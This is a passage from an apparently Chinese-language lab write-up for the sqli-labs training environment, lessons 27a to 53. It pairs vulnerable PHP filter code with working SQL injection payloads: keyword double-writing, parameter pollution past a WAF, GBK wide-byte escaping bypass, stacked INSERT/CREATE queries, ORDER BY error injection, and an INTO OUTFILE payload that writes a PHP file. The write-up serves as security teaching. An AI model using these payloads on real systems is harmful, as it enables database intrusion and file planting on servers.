class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><a href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us" class="headerlink" title="less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us"></a>less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</h3><h4 id="手动注入-27"><a href="#手动注入-27" class="headerlink" title="手动注入"></a>手动注入</h4><p>不能报错注入，直接盲注即可</p>
<h4 id="源码分析-27"><a href="#源码分析-27" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis-基于错误的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis-基于错误的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis (基于错误的，有括号的单引号字符型，过滤了union和select等的注入)"></a>less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis (基于错误的，有括号的单引号字符型，过滤了union和select等的注入)</h3><h4 id="手动注入-28"><a href="#手动注入-28" class="headerlink" title="手动注入"></a>手动注入</h4><p>双写绕过即可</p>
<h4 id="源码分析-28"><a href="#源码分析-28" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入"></a>less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入</h3><h4 id="手动注入-29"><a href="#手动注入-29" class="headerlink" title="手动注入"></a>手动注入</h4><p>双写绕过即可</p>
<h4 id="源码分析-29"><a href="#源码分析-29" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);				//strip out /*</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);				//Strip out --.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);					//Strip out #.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    		//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    		//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Less-29-基于WAF的一个错误"><a href="#Less-29-基于WAF的一个错误" class="headerlink" title="Less-29 基于WAF的一个错误"></a>Less-29 基于WAF的一个错误</h3><h4 id="手动注入-30"><a href="#手动注入-30" class="headerlink" title="手动注入"></a>手动注入</h4><p>注意要配好<code>tomcat</code>的相关环境</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-30-Get-Blind-Havaing-with-WAF"><a href="#Less-30-Get-Blind-Havaing-with-WAF" class="headerlink" title="Less-30 Get-Blind Havaing with WAF"></a>Less-30 Get-Blind Havaing with WAF</h3><h4 id="手动注入-31"><a href="#手动注入-31" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&quot;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-31-Protection-with-WAF"><a href="#Less-31-Protection-with-WAF" class="headerlink" title="Less-31 Protection with WAF"></a><strong>Less-31 Protection with WAF</strong></h3><h4 id="手动注入-32"><a href="#手动注入-32" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&quot;)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-32-Bypass-addslashes"><a href="#Less-32-Bypass-addslashes" class="headerlink" title="Less-32 Bypass addslashes()"></a>Less-32 Bypass addslashes()</h3><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路： </p>
<p>（1）%df 吃掉 \ 具体的原因是 urlencode(‘\) &#x3D; %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此 事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>
<p>（2）将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法</p>
<h4 id="手动注入-33"><a href="#手动注入-33" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-32/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-30"><a href="#源码分析-30" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Less-33-Bypass-addslashes"><a href="#Less-33-Bypass-addslashes" class="headerlink" title="Less-33 Bypass addslashes()"></a>Less-33 Bypass addslashes()</h3><h4 id="手动注入-34"><a href="#手动注入-34" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-33/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-31"><a href="#源码分析-31" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Less-34-Bypass-Add-SLASHES"><a href="#Less-34-Bypass-Add-SLASHES" class="headerlink" title="Less-34 Bypass Add SLASHES"></a>Less-34 Bypass Add SLASHES</h3><h4 id="手动注入-35"><a href="#手动注入-35" class="headerlink" title="手动注入"></a>手动注入</h4><p><img src="https://s2.loli.net/2022/05/17/sv6kSR8guHL12Dh.png" alt="34.png"></p>
<h3 id="Less-35-why-care-for-addslashes"><a href="#Less-35-why-care-for-addslashes" class="headerlink" title="Less-35 why care for addslashes()"></a>Less-35 why care for addslashes()</h3><h4 id="手动注入-36"><a href="#手动注入-36" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-35/?id=-1 <span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>;--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-32"><a href="#源码分析-32" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Less-36-Bypass-MySQL-Real-Escape-String"><a href="#Less-36-Bypass-MySQL-Real-Escape-String" class="headerlink" title="Less-36 Bypass MySQL Real Escape String"></a>Less-36 Bypass MySQL Real Escape String</h3><h4 id="手动注入-37"><a href="#手动注入-37" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-36/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-36/?id=-1%EF%BF%BD&#x27;union <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-33"><a href="#源码分析-33" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Less-37-MySQL-real-escape-string"><a href="#Less-37-MySQL-real-escape-string" class="headerlink" title="Less-37- MySQL_real_escape_string"></a>Less-37- MySQL_real_escape_string</h3><h4 id="手动注入-38"><a href="#手动注入-38" class="headerlink" title="手动注入"></a>手动注入</h4><p>用burp即可</p>
<h4 id="源码分析-34"><a href="#源码分析-34" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$uname1</span>);</span><br><span class="line"><span class="variable">$passwd</span>= <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$passwd1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="Page-3-Stacked-Injections"><a href="#Page-3-Stacked-Injections" class="headerlink" title="Page-3  (Stacked Injections)"></a>Page-3  (Stacked Injections)</h2><h3 id="Less-38-stacked-Query"><a href="#Less-38-stacked-Query" class="headerlink" title="Less-38 stacked Query"></a>Less-38 stacked Query</h3><h4 id="手动注入-39"><a href="#手动注入-39" class="headerlink" title="手动注入"></a>手动注入</h4><p>加入一条数据</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-38/?id=1&#x27;;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;38&#x27;</span>,<span class="string">&#x27;less38&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/FTXO3ltsWAHe6aS.png" alt="38.png"></p>
<h3 id="Less-39-stacked-Query-Intiger-type"><a href="#Less-39-stacked-Query-Intiger-type" class="headerlink" title="Less-39 stacked Query Intiger type"></a>Less-39 stacked Query Intiger type</h3><h4 id="手动注入-40"><a href="#手动注入-40" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-39/?id=1;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;39&#x27;</span>,<span class="string">&#x27;less39&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-40-stacked-Query-String-type-Blind"><a href="#Less-40-stacked-Query-String-type-Blind" class="headerlink" title="Less-40 stacked Query String type Blind"></a>Less-40 stacked Query String type Blind</h3><h4 id="手动注入-41"><a href="#手动注入-41" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-40/?id=1&#x27;); <span class="attribute">insert</span> into users(id,username, password) values (<span class="string">&#x27;40&#x27;</span>,<span class="string">&#x27;less40&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-41-stacked-Query-Intiger-type-blind"><a href="#Less-41-stacked-Query-Intiger-type-blind" class="headerlink" title="Less-41 stacked Query Intiger type blind"></a>Less-41 stacked Query Intiger type blind</h3><h4 id="手动注入-42"><a href="#手动注入-42" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-41/?id=1;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;41&#x27;</span>,<span class="string">&#x27;less41&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-35"><a href="#源码分析-35" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-42-Stacked-Query-error-based"><a href="#Less-42-Stacked-Query-error-based" class="headerlink" title="Less-42 - Stacked Query error based"></a>Less-42 - Stacked Query error based</h3><h4 id="手动注入-43"><a href="#手动注入-43" class="headerlink" title="手动注入"></a>手动注入</h4><p><code>username</code>:admin </p>
<p><code>Password</code>:c’;create table less42 like users–+</p>
<p><img src="https://s2.loli.net/2022/05/17/5ovkQSFNKgiWfdH.png" alt="42.png"></p>
<h3 id="less43-POST-Error-based-String-Stacked-with-tiwst-POST型基于错误的堆叠变形字符型注入"><a href="#less43-POST-Error-based-String-Stacked-with-tiwst-POST型基于错误的堆叠变形字符型注入" class="headerlink" title="less43 POST -Error based -String -Stacked with tiwst(POST型基于错误的堆叠变形字符型注入)"></a>less43 POST -Error based -String -Stacked with tiwst(POST型基于错误的堆叠变形字符型注入)</h3><h4 id="手动注入-44"><a href="#手动注入-44" class="headerlink" title="手动注入"></a>手动注入</h4><p><code>username</code>:admin </p>
<p><code>Password</code>:c’);create table less43 like users–+</p>
<h3 id="Less-44-Stacked-Query-blind"><a href="#Less-44-Stacked-Query-blind" class="headerlink" title="Less-44 - Stacked Query blind"></a>Less-44 - Stacked Query blind</h3><h4 id="手动注入-45"><a href="#手动注入-45" class="headerlink" title="手动注入"></a>手动注入</h4><p><code>username</code>:admin </p>
<p><code>Password</code>:c’;create table less44 like users–+</p>
<h3 id="less-45-基于报错的password处的’-闭合注入"><a href="#less-45-基于报错的password处的’-闭合注入" class="headerlink" title="less-45 基于报错的password处的’)闭合注入"></a>less-45 基于报错的password处的’)闭合注入</h3><h4 id="手动注入-46"><a href="#手动注入-46" class="headerlink" title="手动注入"></a>手动注入</h4><p><code>username</code>:admin </p>
<p><code>Password</code>:c’);create table less45 like users–+</p>
<h3 id="less-46-ORDER-BY-Error-Numeric"><a href="#less-46-ORDER-BY-Error-Numeric" class="headerlink" title="less-46 ORDER BY-Error-Numeric"></a>less-46 ORDER BY-Error-Numeric</h3><h4 id="手动注入-47"><a href="#手动注入-47" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#报错注入</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-46/?sort=(<span class="attribute">select</span> count(*) from information_schema.columns group by concat(0x3a,0x3a,(<span class="literal">select</span> user()),0x3a,0x3a,floor(rand()*<span class="number">2</span>)))</span><br><span class="line"><span class="comment">#也可以导入导出文件into outfile 参数</span></span><br></pre></td></tr></table></figure>

<h4 id="源码分析-36"><a href="#源码分析-36" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-47-ORDER-BY-Clause-Error-Single-quote"><a href="#Less-47-ORDER-BY-Clause-Error-Single-quote" class="headerlink" title="Less-47 - ORDER BY Clause-Error-Single quote"></a>Less-47 - ORDER BY Clause-Error-Single quote</h3><h4 id="手动注入-48"><a href="#手动注入-48" class="headerlink" title="手动注入"></a>手动注入</h4><p><img src="https://s2.loli.net/2022/05/17/qi8F1NCMIayvPrH.png" alt="47.png"></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-47/?sort=1&#x27;<span class="attribute">into</span> outfile <span class="string">&quot;文件地址&quot;</span>lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-48-ORDER-BY-Clause-Blind-based"><a href="#Less-48-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-48 - ORDER BY Clause Blind based"></a>Less-48 - ORDER BY Clause Blind based</h3><h4 id="手动注入-49"><a href="#手动注入-49" class="headerlink" title="手动注入"></a>手动注入</h4><p>布尔盲注、延时注入及对文件操作均可，除不能报错注入外同Less-46</p>
<h3 id="Less49-ORDER-BY-Clause-Blind-based"><a href="#Less49-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less49 - ORDER BY Clause Blind based"></a>Less49 - ORDER BY Clause Blind based</h3><h4 id="手动注入-50"><a href="#手动注入-50" class="headerlink" title="手动注入"></a>手动注入</h4><p>除不能报错注入外同Less-47</p>
<h3 id="Less50-ORDER-BY-Clause-Blind-based"><a href="#Less50-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less50 - ORDER BY Clause Blind based"></a>Less50 - ORDER BY Clause Blind based</h3><h4 id="手动注入-51"><a href="#手动注入-51" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-50/?sort=1;<span class="attribute">create</span> table less50 like users</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/VZUAQPF5jBvIJ8r.png" alt="50.png"></p>
<h3 id="Less-51-ORDER-BY-Clause-Blind-based"><a href="#Less-51-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-51 - ORDER BY Clause Blind based"></a>Less-51 - ORDER BY Clause Blind based</h3><h4 id="手动注入-52"><a href="#手动注入-52" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-51/?sort=1&#x27;;<span class="attribute">create</span> table less51 like users--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-52-ORDER-BY-Clause-Blind-based"><a href="#Less-52-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-52 - ORDER BY Clause Blind based"></a>Less-52 - ORDER BY Clause Blind based</h3><h4 id="手动注入-53"><a href="#手动注入-53" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-52/?sort=1;<span class="attribute">create</span> table less52 like users</span><br></pre></td></tr></table></figure>

<h3 id="Less-53-ORDER-BY-Clause-Blind-based"><a href="#Less-53-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-53 - ORDER BY Clause Blind based"></a>Less-53 - ORDER BY Clause Blind based</h3><h4 id="手动注入-54"><a href="#手动注入-54" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-53/?sort=1&#x27;;<span class="attribute">create</span> table less53 like users--+</span><br></pre></td></tr></table></figure>

